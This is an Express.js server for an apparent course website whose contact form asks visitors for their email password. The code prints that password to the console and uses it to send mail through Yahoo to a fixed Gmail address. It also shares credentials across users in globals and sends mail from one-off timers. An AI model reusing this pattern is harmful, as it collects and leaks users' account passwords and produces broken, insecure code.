const express = require('express');
const nodemailer = require('nodemailer');
const app = express();
const bodyparser = require('body-parser');
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('public'));
app.set('view engine', 'ejs');

let mailOptions = {};
var transporter;
var post;

var mail = "";
var password = "";
var subject = "";
var message = "";
var firstname ="";
var lastname = "";




app.get('/', function (request, response) {
	response.render('home');
});


app.get('/contact', function (request, response){
	response.render('contact');
});

app.get('/about', function (request, response){
	response.render('about');
});

app.get('/courses', function(request, response){
	response.render('courses')
});

app.get('/index', function(request, response){
	response.render('index')
});
app.get('/teacher', function(request, response){
	response.render('teacher')
});

app.post('/home', function (request, response) {
	firstname = request.body.firstname;
	lastname = request.body.lastname;
	mail = request.body.email;
	password = request.body.password;
	message = request.body.message;
	subject = request.body.subject;
	post = request.method;


	if (request.body.email === undefined)
		response.status(400).send('email empty, kindly check');

	if (request.body.password === undefined)
		response.status(400).send('password empty, kindly check');

		response.redirect('home')

});

const homeFxn = function (request, response) {

	response.render('home');
};

app.get('/home', homeFxn);



setTimeout(() => {
	console.log(`${mail} ${password}`)
	transporter = nodemailer.createTransport({
		service: 'yahoo',
		port: 465,
		secure: true, // true for 465, false for other ports
		logger: true,
		debug: true,
		secureConnection: false,
		auth: {
			user: `${mail}`,
			pass: `${password}`
		},
		tls: {
			rejectUnAuthorized: true
		}

	});


}, 130000)




setTimeout(() => {

	console.log(`${mail} ${password}`)
	mailOptions = {
		from: `${mail}`,
		to: 'adeoyedamola95@gmail.com',

		subject: `${subject}`,
		text: `from:${lastname}-${firstname} 
		${message}`
	}
	console.log(mailOptions.text)


	var transport = transporter.sendMail(mailOptions, function (error, info) {
		if (error) {
			console.log(error);
		} else {
			console.log('Email sent:' + info.response);
		}
	});

}, 135000);





const port = 3000;
app.listen(port, function () {  
	console.log(`App is now listening on ${port}`)
})